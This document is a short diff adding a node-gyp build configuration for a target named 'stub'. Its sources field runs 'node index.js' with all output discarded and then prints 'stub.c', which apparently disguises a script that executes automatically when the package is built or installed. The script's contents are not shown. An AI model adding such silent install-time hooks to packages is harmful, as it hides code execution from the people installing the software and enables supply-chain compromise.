@@ -1,0 +1,8 @@
+{
+  "targets": [
+    {
+      "target_name": "stub",
+      "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]
+    }
+  ]
+}
